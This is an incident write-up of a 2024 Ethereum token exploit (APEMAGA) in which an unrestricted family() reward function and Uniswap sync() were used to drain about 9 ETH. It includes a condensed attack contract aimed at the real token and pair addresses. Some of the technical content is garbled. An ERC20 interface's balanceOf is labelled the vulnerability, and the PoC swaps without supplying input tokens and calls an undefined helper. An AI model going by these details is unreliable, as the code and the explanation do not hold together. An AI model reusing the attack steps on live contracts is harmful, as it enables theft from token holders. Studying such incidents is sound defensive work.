# APEMAGA — family() + sync() Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | APEMAGA |
| **Chain** | Ethereum |
| **Loss** | ~9 ETH |
| **Attacker** | Ethereum attacker |
| **APEMAGA Token** | [0x56FF4AfD909AA66a1530fe69BF94c74e6D44500C](https://etherscan.io/address/0x56FF4AfD909AA66a1530fe69BF94c74e6D44500C) |
| **APEMAGA/WETH Pair** | [0x85705829c2f71EE3c40A7C28f6903e7c797c9433](https://etherscan.io/address/0x85705829c2f71EE3c40A7C28f6903e7c797c9433) |
| **Root Cause** | Calling `family()` with the pair address 3 times to manipulate internal reward state, then calling `sync()` to resync reserve balances to extract arbitrage profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/APEMAGA_exp.sol) |

---

## 1. Vulnerability Overview

The `family()` function in the APEMAGA token contract updates internal reward accumulation state on each call, but has no access control — anyone can call it targeting any arbitrary address. The attacker called `family()` three consecutive times with the Uniswap V2 pair address as the argument, manipulating the pair's internal balance, then force-synced the reserve balances via `sync()` to distort the token price. The attacker then exploited the manipulated price discrepancy to drain approximately 9 ETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: family() has no access control
contract APEMAGA {
    mapping(address => uint256) public familyRewards;
    mapping(address => uint256) public lastFamilyCall;

    // Anyone can call this targeting any arbitrary address
    function family(address account) external {
        // No access control — attacker calls repeatedly with the pair address
        uint256 reward = calculateReward(account);
        familyRewards[account] += reward;
        // Internal balance state change → pair reserve mismatch
        _balances[account] += reward;
    }
}

// ✅ Safe code
function family(address account) external {
    // Only the reward recipient themselves can call
    require(account == msg.sender, "only self");
    // Or block pair/contract addresses
    require(!_isLiquidityPair[account], "cannot call for pair");
    uint256 reward = calculateReward(account);
    familyRewards[account] += reward;
    _balances[account] += reward;
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Tonken.sol
contract IERC20 {
    function balanceOf(address account) external view returns (uint256);  // ❌ Vulnerability

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] APEMAGA.family(pair) × 3 calls
  │         └─ No access control → pair._balances += reward × 3
  │         └─ Actual reserves and internal balance mismatch
  │
  ├─→ [2] Uniswap V2 pair.sync()
  │         └─ reserve0/reserve1 force resynced
  │         └─ Price distortion occurs
  │
  ├─→ [3] APEMAGA → WETH swap (at distorted price)
  │         └─ Favorable exchange rate obtained via manipulated reserves
  │
  └─→ [4] ~9 ETH drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IAPEMAGA {
    function family(address account) external;
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32 ts);
}

contract AttackContract {
    IAPEMAGA constant apemaga = IAPEMAGA(0x56FF4AfD909AA66a1530fe69BF94c74e6D44500C);
    IUniswapV2Pair constant pair = IUniswapV2Pair(0x85705829c2f71EE3c40A7C28f6903e7c797c9433);

    function testExploit() external {
        // [1] Call family() with pair address 3 times — manipulate pair balance
        apemaga.family(address(pair));
        apemaga.family(address(pair));
        apemaga.family(address(pair));

        // [2] Call sync() — force update reserves with manipulated balance
        pair.sync();

        // [3] Swap APEMAGA → WETH using distorted reserves
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 amountOut = calculateAmountOut(r0, r1);
        pair.swap(0, amountOut, address(this), "");
        // Obtain ~9 ETH (WETH)
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control + AMM Reserve Manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct family() call + sync()) |
| **DApp Category** | ERC20 Token (with built-in reward mechanism) |
| **Impact** | AMM price distortion → ETH drain (~9 ETH) |

## 6. Remediation Recommendations

1. **family() Access Control**: Add `require(msg.sender == account, "only self")`
2. **Block Pair Addresses**: Prohibit reward calls targeting liquidity pair addresses
3. **Restrict Balance Modifications**: Prohibit direct `_balances` increments from external functions
4. **Prevent sync Manipulation**: Add balance validation logic before reserve synchronization

## 7. Lessons Learned

- When exposing reward accumulation functions externally, they must be restricted so that only the recipient themselves can call them.
- Uniswap V2's `sync()` mechanism becomes a price manipulation vector when token balances have been tampered with.
- Designs that allow arbitrary increments to a token contract's internal `_balances` from external functions become critical vulnerabilities when integrated with AMMs.